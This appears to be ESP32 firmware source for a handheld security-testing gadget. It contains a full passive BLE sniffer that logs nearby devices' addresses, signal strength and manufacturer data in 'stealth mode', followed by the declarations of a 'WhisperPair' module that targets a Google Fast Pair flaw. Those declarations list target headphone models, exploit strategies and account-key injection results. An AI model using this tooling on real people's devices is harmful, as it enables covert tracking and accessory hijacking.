static void addOrUpdateDevice(uint8_t* mac, int8_t rssi, const char* name,
                               bool hasName, uint8_t* mfgData, uint8_t mfgLen) {
    uint32_t now = millis();
    int idx = findDevice(mac);

    if (idx >= 0) {
        // Update existing device
        BleDevice* d = &devices[idx];
        d->rssi = rssi;
        if (rssi < d->rssiMin) d->rssiMin = rssi;
        if (rssi > d->rssiMax) d->rssiMax = rssi;
        d->lastSeen = now;
        d->frameCount++;
        if (hasName && !d->hasName) {
            strncpy(d->name, name, 16);
            d->name[16] = '\0';
            d->hasName = true;
        }
        if (mfgLen > 0 && d->mfgDataLen == 0) {
            uint8_t copyLen = mfgLen > 8 ? 8 : mfgLen;
            memcpy(d->mfgData, mfgData, copyLen);
            d->mfgDataLen = copyLen;
            uint16_t cid = extractCompanyId(mfgData, mfgLen);
            if (cid != 0xFFFF) d->companyId = cid;
        }
        return;
    }

    // Add new device
    if (deviceCount >= BSNIFF_MAX_DEVICES) return;

    BleDevice* d = &devices[deviceCount];
    memcpy(d->mac, mac, 6);
    d->rssi = rssi;
    d->rssiMin = rssi;
    d->rssiMax = rssi;
    d->firstSeen = now;
    d->lastSeen = now;
    d->frameCount = 1;
    d->randomMAC = (mac[0] & 0x02) != 0;

    if (hasName) {
        strncpy(d->name, name, 16);
        d->name[16] = '\0';
        d->hasName = true;
    } else {
        d->name[0] = '\0';
        d->hasName = false;
    }

    strncpy(d->vendor, lookupVendor(mac), 7);
    d->vendor[7] = '\0';

    if (mfgLen > 0) {
        uint8_t copyLen = mfgLen > 8 ? 8 : mfgLen;
        memcpy(d->mfgData, mfgData, copyLen);
        d->mfgDataLen = copyLen;
        d->companyId = extractCompanyId(mfgData, mfgLen);
    } else {
        d->mfgDataLen = 0;
        d->companyId = 0xFFFF;
    }

    deviceCount++;

    #if CYD_DEBUG
    Serial.printf("[BSNIFF] +DEV #%d %02X:%02X:%02X:%02X:%02X:%02X %ddBm %s %s\n",
                  deviceCount, mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
                  rssi, d->vendor, devDisplayLabel(d->companyId, d->hasName));
    #endif
}

// ── Filter check ─────────────────────────────────────────────────────────
static bool passesFilter(BleDevice* d) {
    switch (currentFilter) {
        case FILT_NAMED:  return d->hasName;
        case FILT_APPLE:  return d->companyId == 0x004C;  // Apple BT SIG company ID
        case FILT_STRONG: return d->rssi > -60;
        default:          return true;
    }
}

static int countFiltered() {
    if (currentFilter == FILT_ALL) return deviceCount;
    int count = 0;
    for (int i = 0; i < deviceCount; i++) {
        if (passesFilter(&devices[i])) count++;
    }
    return count;
}

// ═══════════════════════════════════════════════════════════════════════════
// BLE SCAN CALLBACKS
// ═══════════════════════════════════════════════════════════════════════════

class SnifferCallbacks : public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice advertisedDevice) override {
        if (pendingReady) return;  // Queue full, skip this frame

        // Copy MAC
        const uint8_t* addr = *advertisedDevice.getAddress().getNative();
        memcpy(pendingMAC, addr, 6);
        pendingRSSI = advertisedDevice.getRSSI();

        // Copy name
        if (advertisedDevice.haveName() && advertisedDevice.getName().length() > 0) {
            strncpy(pendingName, advertisedDevice.getName().c_str(), 16);
            pendingName[16] = '\0';
            pendingHasName = true;
        } else {
            pendingName[0] = '\0';
            pendingHasName = false;
        }

        // Copy manufacturer data
        if (advertisedDevice.haveManufacturerData()) {
            std::string mfg = advertisedDevice.getManufacturerData();
            pendingMfgLen = mfg.length() > 8 ? 8 : mfg.length();
            memcpy(pendingMfgData, mfg.data(), pendingMfgLen);
        } else {
            pendingMfgLen = 0;
        }

        pendingReady = true;
    }
};

static SnifferCallbacks snifferCB;

// Scan completion callback — restart for continuous scanning
static void scanCompleteCallback(BLEScanResults results) {
    if (scanning && pBleScan) {
        // is_continue = false → clears BLE library's internal device map to prevent heap exhaustion
        pBleScan->start(5, scanCompleteCallback, false);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// UI DRAWING
// ═══════════════════════════════════════════════════════════════════════════

static void drawIconBar() {
    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
    for (int i = 0; i < BSNIFF_ICON_NUM; i++) {
        uint16_t color = HALEHOUND_MAGENTA;
        // Use HALEHOUND_MAGENTA (Electric Blue 0x041F) for active — CYAN and HOTPINK are same color (0xF81F)
        if (i == 1 && scanning) color = HALEHOUND_MAGENTA;    // Scan toggle ELECTRIC BLUE when active
        if (i == 1 && !scanning) color = HALEHOUND_GUNMETAL;  // Scan toggle dim when stopped
        if (i == 5 && scanning) color = HALEHOUND_MAGENTA;    // BLE pulse ELECTRIC BLUE when active
        if (i == 5 && !scanning) color = HALEHOUND_GUNMETAL;  // BLE pulse dim when stopped
        tft.drawBitmap(bsniffIconX[i], ICON_BAR_Y, bsniffIcons[i], BSNIFF_ICON_SIZE, BSNIFF_ICON_SIZE, color);
    }
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);

    // Scan status text next to play icon
    tft.setTextSize(1);
    tft.fillRect(SCALE_X(35), ICON_BAR_Y + 2, SCALE_W(18), 10, HALEHOUND_GUNMETAL);
    if (scanning) {
        tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_GUNMETAL);
        tft.setCursor(SCALE_X(35), ICON_BAR_Y + 3);
        tft.print("ON");
    } else {
        tft.setTextColor(HALEHOUND_GUNMETAL, HALEHOUND_GUNMETAL);
    }
}

static void drawHeader() {
    tft.fillRect(0, SCALE_Y(38), SCREEN_WIDTH, SCALE_H(20), HALEHOUND_BLACK);
    drawGlitchText(SCALE_Y(55), "BLE SNIFF", &Nosifer_Regular10pt7b);

    // Device count + filter name on right side
    tft.setFreeFont(NULL);
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
    tft.setCursor(5, SCALE_Y(42));
    int filtered = countFiltered();
    tft.printf("%d/%d", filtered, deviceCount);
    tft.setTextColor(HALEHOUND_VIOLET, HALEHOUND_BLACK);
    tft.setCursor(SCALE_X(195), SCALE_Y(42));
    tft.print(filterNames[currentFilter]);
}

static void drawColumnHeaders() {
    tft.fillRect(0, SCALE_Y(58), SCREEN_WIDTH, SCALE_H(14), HALEHOUND_DARK);
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(SCALE_X(5), SCALE_Y(60));
    tft.print("MAC");
    tft.setCursor(SCALE_X(80), SCALE_Y(60));
    tft.print("dB");
    tft.setCursor(SCALE_X(115), SCALE_Y(60));
    tft.print("TYPE");
    tft.setCursor(SCALE_X(170), SCALE_Y(60));
    tft.print("VENDOR");
}

static void drawDeviceList() {
    int listY = SCALE_Y(74);
    int listH = SCALE_H(199);
    tft.fillRect(0, listY, SCREEN_WIDTH, listH, HALEHOUND_BLACK);

    if (deviceCount == 0) {
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.setTextSize(1);
        tft.setCursor(SCALE_X(40), SCALE_Y(140));
        tft.print("Scanning for devices...");
        return;
    }

    uint32_t now = millis();
    int y = listY;
    int visibleIdx = 0;
    int drawn = 0;
    int skipped = 0;

    for (int i = 0; i < deviceCount && drawn < BSNIFF_MAX_VISIBLE; i++) {
        BleDevice* d = &devices[i];
        if (!passesFilter(d)) continue;

        // Pagination: skip items before listStartIndex
        if (skipped < listStartIndex) {
            skipped++;
            continue;
        }

        uint32_t age = now - d->lastSeen;

        // Color coding
        uint16_t rowColor;
        if (visibleIdx + listStartIndex == currentIndex) {
            rowColor = HALEHOUND_BRIGHT;           // Highlighted/selected
        } else if (age < 5000 && d->hasName) {
            rowColor = TFT_WHITE;                  // Recent + named
        } else if (age < 5000) {
            rowColor = HALEHOUND_MAGENTA;             // Recent
        } else if (d->companyId != 0xFFFF && lookupCompanyName(d->companyId) != nullptr) {
            rowColor = HALEHOUND_VIOLET;           // Known manufacturer type
        } else if (age > 30000) {
            rowColor = HALEHOUND_GUNMETAL;         // Stale
        } else {
            rowColor = HALEHOUND_MAGENTA;
        }

        // Highlight selected row background
        if (visibleIdx + listStartIndex == currentIndex) {
            tft.fillRect(0, y, SCREEN_WIDTH, BSNIFF_ITEM_HEIGHT - 2, HALEHOUND_DARK);
        }

        tft.setTextColor(rowColor);
        tft.setTextSize(1);

        // MAC (last 3 octets)
        char macStr[10];
        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X",
                 d->mac[3], d->mac[4], d->mac[5]);
        tft.setCursor(SCALE_X(5), y + SCALE_H(4));
        tft.print(macStr);

        // RSSI
        tft.setCursor(SCALE_X(80), y + SCALE_H(4));
        tft.printf("%d", d->rssi);

        // Type (company name from ble_database.h)
        tft.setCursor(SCALE_X(115), y + SCALE_H(4));
        tft.print(devDisplayLabel(d->companyId, d->hasName));

        // Vendor
        tft.setCursor(SCALE_X(170), y + SCALE_H(4));
        tft.print(d->vendor);

        // Frame count indicator (small dot for active devices)
        if (d->frameCount > 5 && age < 10000) {
            tft.fillCircle(SCREEN_WIDTH - SCALE_X(5), y + SCALE_H(8), 2, HALEHOUND_HOTPINK);
        }

        y += BSNIFF_ITEM_HEIGHT;
        drawn++;
        visibleIdx++;
    }
}

static void drawStatsLine() {
    int statsY = SCALE_Y(273);
    tft.fillRect(0, statsY, SCREEN_WIDTH, SCALE_H(10), HALEHOUND_BLACK);
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);

    int filtered = countFiltered();
    uint32_t elapsed = (millis() - scanStartTime) / 1000;
    uint32_t mins = elapsed / 60;
    uint32_t secs = elapsed % 60;

    tft.setCursor(5, statsY + 1);
    tft.printf("T:%d F:%d", deviceCount, filtered);

    tft.setTextColor(HALEHOUND_VIOLET, HALEHOUND_BLACK);
    tft.setCursor(SCALE_X(160), statsY + 1);
    tft.printf("%02d:%02d", mins, secs);

    tft.fillRect(SCALE_X(200), statsY + 1, SCALE_W(40), 8, HALEHOUND_BLACK);
    if (scanning) {
        tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
        tft.setCursor(SCALE_X(210), statsY + 1);
        tft.print("LIVE");
    } else {
        tft.setTextColor(HALEHOUND_GUNMETAL, HALEHOUND_BLACK);
        tft.setCursor(SCALE_X(200), statsY + 1);
        tft.print("PAUSE");
    }
}

static void drawButtonBar() {
    int barY  = SCALE_Y(283);
    int barH  = SCALE_H(37);
    int btnY  = SCALE_Y(288);
    int btnH  = SCALE_H(25);
    int txtY  = SCALE_Y(296);

    tft.fillRect(0, barY, SCREEN_WIDTH, barH, HALEHOUND_GUNMETAL);

    // BACK button
    tft.fillRect(SCALE_X(5), btnY, SCALE_W(37), btnH, HALEHOUND_DARK);
    tft.drawRect(SCALE_X(5), btnY, SCALE_W(37), btnH, HALEHOUND_MAGENTA);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setTextSize(1);
    tft.setCursor(SCALE_X(8), txtY);
    tft.print("BACK");

    // INFO button
    uint16_t infoColor = (deviceCount > 0) ? HALEHOUND_MAGENTA : HALEHOUND_GUNMETAL;
    tft.fillRect(SCALE_X(47), btnY, SCALE_W(35), btnH, HALEHOUND_DARK);
    tft.drawRect(SCALE_X(47), btnY, SCALE_W(35), btnH, infoColor);
    tft.setTextColor(infoColor);
    tft.setCursor(SCALE_X(52), txtY);
    tft.print("INFO");

    // PREV button
    uint16_t prevColor = (listStartIndex > 0) ? HALEHOUND_MAGENTA : HALEHOUND_GUNMETAL;
    tft.fillRect(SCALE_X(87), btnY, SCALE_W(30), btnH, HALEHOUND_DARK);
    tft.drawRect(SCALE_X(87), btnY, SCALE_W(30), btnH, prevColor);
    tft.setTextColor(prevColor);
    tft.setCursor(SCALE_X(92), txtY);
    tft.print("PRV");

    // Page indicator
    int filtered = countFiltered();
    int totalPages = (filtered + BSNIFF_MAX_VISIBLE - 1) / BSNIFF_MAX_VISIBLE;
    if (totalPages < 1) totalPages = 1;
    int curPage = (listStartIndex / BSNIFF_MAX_VISIBLE) + 1;
    tft.fillRect(SCALE_X(120), btnY, SCALE_W(40), btnH, HALEHOUND_DARK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(SCALE_X(127), txtY);
    tft.printf("%d/%d", curPage, totalPages);

    // NEXT button
    uint16_t nextColor = (listStartIndex + BSNIFF_MAX_VISIBLE < filtered) ? HALEHOUND_MAGENTA : HALEHOUND_GUNMETAL;
    tft.fillRect(SCALE_X(163), btnY, SCALE_W(30), btnH, HALEHOUND_DARK);
    tft.drawRect(SCALE_X(163), btnY, SCALE_W(30), btnH, nextColor);
    tft.setTextColor(nextColor);
    tft.setCursor(SCALE_X(168), txtY);
    tft.print("NXT");

    // CLR button
    tft.fillRect(SCALE_X(198), btnY, SCALE_W(35), btnH, HALEHOUND_DARK);
    tft.drawRect(SCALE_X(198), btnY, SCALE_W(35), btnH, HALEHOUND_HOTPINK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(SCALE_X(205), txtY);
    tft.print("CLR");
}

static void drawFullUI() {
    drawIconBar();
    drawHeader();
    drawColumnHeaders();
    drawDeviceList();
    drawStatsLine();
    drawButtonBar();
}

// ═══════════════════════════════════════════════════════════════════════════
// DETAIL VIEW (popup overlay)
// ═══════════════════════════════════════════════════════════════════════════

static void showDeviceDetail(int idx) {
    // Find the actual device index through the filter
    int filtIdx = 0;
    int realIdx = -1;
    for (int i = 0; i < deviceCount; i++) {
        if (!passesFilter(&devices[i])) continue;
        if (filtIdx == idx) { realIdx = i; break; }
        filtIdx++;
    }
    if (realIdx < 0 || realIdx >= deviceCount) return;

    BleDevice* d = &devices[realIdx];
    detailView = true;

    // Draw overlay
    int ovX = SCALE_X(10);
    int ovY = SCALE_Y(40);
    int ovW = tft.width() - SCALE_X(20);
    int ovH = tft.height() - SCALE_H(80);
    tft.fillRect(ovX, ovY, ovW, ovH, HALEHOUND_BLACK);
    tft.drawRect(ovX, ovY, ovW, ovH, HALEHOUND_HOTPINK);
    tft.drawRect(ovX + 1, ovY + 1, ovW - 2, ovH - 2, HALEHOUND_VIOLET);

    int y = SCALE_Y(52);
    int lineH = SCALE_H(16);
    int textX = SCALE_X(18);
    tft.setTextSize(1);

    // Name
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(textX, y);
    tft.print("Name: ");
    tft.setTextColor(TFT_WHITE);
    tft.print(d->hasName ? d->name : "(none)");
    y += lineH;

    // Full MAC
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(textX, y);
    tft.print("MAC: ");
    tft.setTextColor(HALEHOUND_MAGENTA);
    char fullMac[18];
    snprintf(fullMac, sizeof(fullMac), "%02X:%02X:%02X:%02X:%02X:%02X",
             d->mac[0], d->mac[1], d->mac[2], d->mac[3], d->mac[4], d->mac[5]);
    tft.print(fullMac);
    y += lineH;

    // Random MAC flag
    if (d->randomMAC) {
        tft.setTextColor(HALEHOUND_VIOLET);
        tft.setCursor(textX, y);
        tft.print("(Locally Administered / Random)");
        y += SCALE_H(14);
    }

    // Type
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(textX, y);
    tft.print("Type: ");
    tft.setTextColor(HALEHOUND_BRIGHT);
    tft.print(devDisplayLabel(d->companyId, d->hasName));
    y += lineH;

    // Vendor
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(textX, y);
    tft.print("Vendor: ");
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.print(d->vendor);
    y += lineH;

    // RSSI current / min / max
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(textX, y);
    tft.print("RSSI: ");
    tft.setTextColor(TFT_WHITE);
    tft.printf("%d dBm", d->rssi);
    tft.setTextColor(HALEHOUND_GUNMETAL);
    tft.printf(" (%d/%d)", d->rssiMin, d->rssiMax);
    y += lineH;

    // Frame count
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(textX, y);
    tft.print("Frames: ");
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.print(d->frameCount);
    y += lineH;

    // First/Last seen
    uint32_t now = millis();
    uint32_t firstAge = (now - d->firstSeen) / 1000;
    uint32_t lastAge = (now - d->lastSeen) / 1000;

    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(textX, y);
    tft.print("First: ");
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.printf("%ds ago", firstAge);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.print(" Last: ");
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.printf("%ds", lastAge);
    y += lineH;

    // Manufacturer data hex dump
    if (d->mfgDataLen > 0) {
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.setCursor(textX, y);
        tft.print("MfgData: ");
        tft.setTextColor(HALEHOUND_VIOLET);
        for (int i = 0; i < d->mfgDataLen; i++) {
            tft.printf("%02X ", d->mfgData[i]);
        }
        y += lineH;
    }

    // Close button
    int closeY = SCALE_Y(260);
    int closeX = SCALE_X(85);
    int closeW = SCALE_W(70);
    int closeH = SCALE_H(18);
    tft.fillRect(closeX, closeY, closeW, closeH, HALEHOUND_DARK);
    tft.drawRect(closeX, closeY, closeW, closeH, HALEHOUND_MAGENTA);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(SCALE_X(100), closeY + SCALE_H(4));
    tft.print("CLOSE");
}

// ═══════════════════════════════════════════════════════════════════════════
// TOUCH HANDLING
// ═══════════════════════════════════════════════════════════════════════════

// Touch-release tracking — prevents held finger from firing multiple actions
static bool waitForRelease = false;

static void handleTouch() {
    static unsigned long lastTap = 0;

    uint16_t tx, ty;
    bool touching = getTouchPoint(&tx, &ty);

    // Wait for finger to lift after any view-changing action
    if (waitForRelease) {
        if (!touching) waitForRelease = false;
        return;
    }

    if (!touching) return;
    if (millis() - lastTap < 400) return;  // 400ms debounce — CYD touch needs firm timing
    lastTap = millis();

    // ── Detail view: ONLY close via CLOSE button or back icon ────────────
    if (detailView) {
        // CLOSE button
        if (ty >= SCALE_Y(255) && ty <= SCALE_Y(280) && tx >= SCALE_X(80) && tx <= SCALE_X(160)) {
            detailView = false;
            waitForRelease = true;
            drawFullUI();
            return;
        }
        // Back icon in icon bar
        if (ty >= ICON_BAR_Y && ty <= ICON_BAR_BOTTOM && tx >= SCALE_X(10) && tx < SCALE_X(30)) {
            detailView = false;
            waitForRelease = true;
            drawFullUI();
            return;
        }
        // All other touches in detail view are ignored
        return;
    }

    // ── Icon bar ────────────────────────────────────────────────────────
    if (ty >= ICON_BAR_Y && ty <= ICON_BAR_BOTTOM) {
        for (int i = 0; i < BSNIFF_ICON_NUM; i++) {
            if (tx >= bsniffIconX[i] && tx < bsniffIconX[i] + BSNIFF_ICON_SIZE + SCALE_X(10)) {
                switch (i) {
                    case 0:  // Back
                        exitRequested = true;
                        waitForRelease = true;
                        return;
                    case 1:  // Scan toggle
                        if (scanning) {
                            scanning = false;
                            if (pBleScan) pBleScan->stop();
                        } else {
                            scanning = true;
                            if (pBleScan) pBleScan->start(5, scanCompleteCallback, false);
                        }
                        waitForRelease = true;
                        drawIconBar();
                        drawStatsLine();
                        return;
                    case 2:  // Filter left
                        currentFilter = (SniffFilter)((currentFilter + FILT_COUNT - 1) % FILT_COUNT);
                        listStartIndex = 0;
                        currentIndex = 0;
                        waitForRelease = true;
                        drawHeader();
                        drawDeviceList();
                        drawStatsLine();
                        drawButtonBar();
                        return;
                    case 3:  // Filter right
                        currentFilter = (SniffFilter)((currentFilter + 1) % FILT_COUNT);
                        listStartIndex = 0;
                        currentIndex = 0;
                        waitForRelease = true;
                        drawHeader();
                        drawDeviceList();
                        drawStatsLine();
                        drawButtonBar();
                        return;
                    case 4:  // Eye/detail
                        if (deviceCount > 0) {
                            showDeviceDetail(currentIndex);
                            waitForRelease = true;
                        }
                        return;
                    case 5:  // BLE pulse (indicator only — no action)
                        return;
                }
            }
        }
        return;
    }

    // ── Device list area: tap to select ──────────────────────────────────
    int listTopY = SCALE_Y(74);
    int listBotY = SCALE_Y(273);
    if (ty >= listTopY && ty < listBotY && deviceCount > 0) {
        int tappedRow = (ty - listTopY) / BSNIFF_ITEM_HEIGHT;
        int newIdx = listStartIndex + tappedRow;
        int filtered = countFiltered();
        if (newIdx < filtered) {
            currentIndex = newIdx;
            waitForRelease = true;
            drawDeviceList();
        }
        return;
    }

    // ── Button bar ──────────────────────────────────────────────────────
    if (ty >= SCALE_Y(283)) {
        waitForRelease = true;
        if (tx >= SCALE_X(5) && tx < SCALE_X(42)) {
            // BACK
            exitRequested = true;
        } else if (tx >= SCALE_X(47) && tx < SCALE_X(82)) {
            // INFO
            if (deviceCount > 0) showDeviceDetail(currentIndex);
        } else if (tx >= SCALE_X(87) && tx < SCALE_X(117)) {
            // PREV
            if (listStartIndex >= BSNIFF_MAX_VISIBLE) {
                listStartIndex -= BSNIFF_MAX_VISIBLE;
                currentIndex = listStartIndex;
                drawDeviceList();
                drawButtonBar();
            }
        } else if (tx >= SCALE_X(163) && tx < SCALE_X(193)) {
            // NEXT
            int filtered = countFiltered();
            if (listStartIndex + BSNIFF_MAX_VISIBLE < filtered) {
                listStartIndex += BSNIFF_MAX_VISIBLE;
                currentIndex = listStartIndex;
                drawDeviceList();
                drawButtonBar();
            }
        } else if (tx >= SCALE_X(198) && tx < SCALE_X(233)) {
            // CLR
            deviceCount = 0;
            currentIndex = 0;
            listStartIndex = 0;
            scanStartTime = millis();
            drawHeader();
            drawDeviceList();
            drawStatsLine();
            drawButtonBar();
            #if CYD_DEBUG
            Serial.println("[BSNIFF] Device list cleared");
            #endif
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// SETUP / LOOP / CLEANUP
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    if (initialized) return;

    #if CYD_DEBUG
    Serial.println("[BSNIFF] Initializing BLE Sniffer...");
    #endif

    // Reset state
    deviceCount = 0;
    currentIndex = 0;
    listStartIndex = 0;
    currentFilter = FILT_ALL;
    exitRequested = false;
    detailView = false;
    waitForRelease = false;
    pendingReady = false;
    scanStartTime = millis();
    lastDisplayUpdate = 0;

    // Draw initial UI
    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();

    // Tear down WiFi before BLE init — frees ~50KB heap
    WiFi.mode(WIFI_OFF);
    delay(50);

    // BLE init
    releaseClassicBtMemory();
    BLEDevice::init("");
    delay(150);  // Race condition fix — BLE controller needs time

    pBleScan = BLEDevice::getScan();
    if (!pBleScan) {
        #if CYD_DEBUG
        Serial.println("[BSNIFF] ERROR: getScan() returned NULL");
        #endif
        exitRequested = true;
        return;
    }

    pBleScan->setActiveScan(false);  // PASSIVE — no SCAN_REQ sent, stealth mode
    pBleScan->setInterval(100);      // Scan timing (wardriving pattern)
    pBleScan->setWindow(99);         // Near-continuous listening
    pBleScan->setAdvertisedDeviceCallbacks(&snifferCB, true);  // wantDuplicates = true

    scanning = true;
    initialized = true;

    drawFullUI();

    // Start continuous non-blocking scan
    pBleScan->start(5, scanCompleteCallback, false);

    #if CYD_DEBUG
    Serial.println("[BSNIFF] Passive scanning started");
    #endif
}

void loop() {
    if (!initialized) return;

    // Process pending device from BLE callback
    if (pendingReady) {
        addOrUpdateDevice(pendingMAC, pendingRSSI, pendingName,
                          pendingHasName, pendingMfgData, pendingMfgLen);
        pendingReady = false;
    }

    // Throttled display update (500ms)
    unsigned long now = millis();
    if (now - lastDisplayUpdate > 500 && !detailView) {
        drawHeader();
        drawDeviceList();
        drawStatsLine();
        drawButtonBar();
        lastDisplayUpdate = now;
    }

    // Touch handling — ALL navigation goes through handleTouch()
    // DO NOT use buttonPressed() — CYD touch zones (BTN_BACK=x160-240 y0-60,
    // BTN_UP=x0-80 y0-60, BTN_SELECT=x80-160 y130-190) overlap our icon bar
    // and device list, causing phantom exits and misfires
    handleTouch();

    // Physical BOOT button — uses IS_BOOT_PRESSED() macro (returns false on E32R28T
    // where GPIO0 is permanently LOW due to CC1101 E07 PA module)
    static unsigned long lastBootPress = 0;
    if (IS_BOOT_PRESSED() && millis() - lastBootPress > 500) {
        lastBootPress = millis();
        if (detailView) {
            detailView = false;
            waitForRelease = true;
            drawFullUI();
        } else {
            exitRequested = true;
        }
    }
}

bool isExitRequested() { return exitRequested; }

void cleanup() {
    if (pBleScan) {
        if (scanning) pBleScan->stop();
        pBleScan->setAdvertisedDeviceCallbacks(nullptr, false);  // Deregister callback so BleScan gets clean scan object
    }
    scanning = false;
    BLEDevice::deinit(false);  // MUST be false — deinit(true) bug never resets initialized flag
    pBleScan = nullptr;
    initialized = false;
    exitRequested = false;
    detailView = false;
    waitForRelease = false;
    pendingReady = false;

    // Restore WiFi for other modules
    WiFi.mode(WIFI_STA);

    #if CYD_DEBUG
    Serial.println("[BSNIFF] Cleanup complete — deinit(false)");
    #endif
}

}  // namespace BleSniffer


// ═══════════════════════════════════════════════════════════════════════════
// WHISPERPAIR - CVE-2025-36911 Fast Pair Vulnerability Scanner
// Scans for Google Fast Pair devices and probes for WhisperPair vulnerability
// Phase 1: Discovery + GATT Service Probe
// ═══════════════════════════════════════════════════════════════════════════

namespace WhisperPair {

// ─── Constants ───────────────────────────────────────────────────────────
#define WP_MAX_DEVICES 16
#define WP_LINE_HEIGHT 16
#define WP_MAX_VISIBLE 12
#define WP_SCAN_SECS 8

// ─── Probe Result Codes ──────────────────────────────────────────────────
#define WPR_NONE        0   // Not probed yet
#define WPR_UNREACHABLE 1   // GATT connection failed
#define WPR_NO_SERVICE  2   // Fast Pair service not found
#define WPR_NO_CHAR     3   // KBP characteristic not found (patched)
#define WPR_EXPOSED     4   // KBP char found outside pairing mode
#define WPR_VULNERABLE  5   // Device responded to KBP request

// ─── Known Fast Pair Model IDs ───────────────────────────────────────────
// Same model IDs as BleSpoofer FAST_PAIR_MODELS array (verified working)
struct WPModel {
    uint8_t id[3];
    const char* name;
};

static const WPModel wpModels[] = {
    {{0xD9, 0x93, 0x30}, "Pixel Buds Pro"},
    {{0x82, 0x1F, 0x66}, "Pixel Buds A"},
    {{0x71, 0x7F, 0x41}, "Pixel Buds"},
    {{0xF5, 0x24, 0x94}, "Sony WH-XM4"},
    {{0xF0, 0x09, 0x17}, "Sony WH-XM5"},
    {{0x01, 0x00, 0x06}, "Bose NC 700"},
    {{0xEF, 0x44, 0x63}, "Bose QC Ultra"},
    {{0x03, 0x1E, 0x06}, "JBL Flip 6"},
    {{0x92, 0xB2, 0x5E}, "JBL LivePro2"},
    {{0x1E, 0x89, 0xA7}, "Razer HH"},
    {{0x02, 0xAA, 0x91}, "Jabra 75t"},
    {{0x2D, 0x7A, 0x23}, "Nothing Ear1"},
    {{0xD4, 0x46, 0xA7}, "Sony LinkBuds"},
    {{0x72, 0xEF, 0x62}, "Gal Buds FE"},
    {{0xF5, 0x8D, 0x14}, "JBL Buds Pro"},
};
#define WP_MODEL_COUNT (sizeof(wpModels) / sizeof(wpModels[0]))

// ─── Device Info ─────────────────────────────────────────────────────────
struct FPDevice {
    char addrStr[18];               // "AA:BB:CC:DD:EE:FF"
    esp_ble_addr_type_t addrType;
    uint32_t modelId;
    int rssi;
    char name[24];
    uint8_t result;                 // WPR_* code
};

// ─── State ───────────────────────────────────────────────────────────────
static bool wpInit = false;
static bool wpExit = false;
static bool inResult = false;
static FPDevice wpDevs[WP_MAX_DEVICES];
static int wpCount = 0;
static int wpCurIdx = 0;
static int wpListStart = 0;
static int wpProbeIdx = -1;
static BLEScan* pWpScan = nullptr;
static BLEClient* pWpClient = nullptr;
static volatile bool wpNotifRx = false;
static uint8_t wpNotifData[20];
static size_t wpNotifLen = 0;

// GATT UUIDs
static BLEUUID wpFpUUID16((uint16_t)0xFE2C);
static BLEUUID wpFpUUID128("0000fe2c-0000-1000-8000-00805f9b34fb");
static BLEUUID wpKbpUUID("fe2c1234-8366-4814-8eb0-01de32100bea");

// Icon bar
static int wpIconX[2] = {210, 10};
static int wpIconY = 20;

// Attack-phase UUIDs created as locals in wpRunAttack() to save DRAM

// ─── KBP Exploit Strategies ─────────────────────────────────────────────
struct WPStrategy {
    const char* name;
    uint8_t flags;
};

static const WPStrategy wpStrategies[] = {
    {"RAW_KBP",      0x11},
    {"WITH_SEEKER",  0x02},
    {"RETROACTIVE",  0x0A},
    {"EXTENDED",     0x10},
};

// ─── Attack Result ──────────────────────────────────────────────────────
struct WPAttackResult {
    bool phase1Done;
    bool phase2Done;
    bool phase3Done;
    int  strategyUsed;          // which strategy got first response (-1 = none)
    uint8_t brEdrAddr[6];       // extracted BR/EDR (Classic BT) address
    bool hasBrEdr;
    uint8_t kbpResp[20];        // raw KBP notification response
    size_t  kbpRespLen;
    bool acctKeyWritten;        // Phase 2 success
    uint8_t acctKey[16];        // the account key we injected
    bool hasPasskey;            // Phase 3 — passkey char exists
    bool hasAdditional;         // Phase 3 — additional data char exists
    uint8_t modelIdBytes[3];    // from GATT char read
    bool hasModelId;
    char firmware[20];          // firmware revision string
    bool hasFirmware;
    uint8_t strategyResults[4]; // 0=not tried, 1=fail, 2=success
};

// ─── Attack State ───────────────────────────────────────────────────────
static bool inAttack = false;
static bool inAttackResult = false;
static bool inLootViewer = false;
static int  atkResultPage = 0;
static WPAttackResult wpAtkResult;

// ─── Attack Scrolling Log ───────────────────────────────────────────────
#define WP_ATK_LOG_LINES 10
#define WP_ATK_LOG_WIDTH 36
static char wpAtkLog[WP_ATK_LOG_LINES][WP_ATK_LOG_WIDTH];
static uint16_t wpAtkLogColors[WP_ATK_LOG_LINES];
static int wpAtkLogCount = 0;

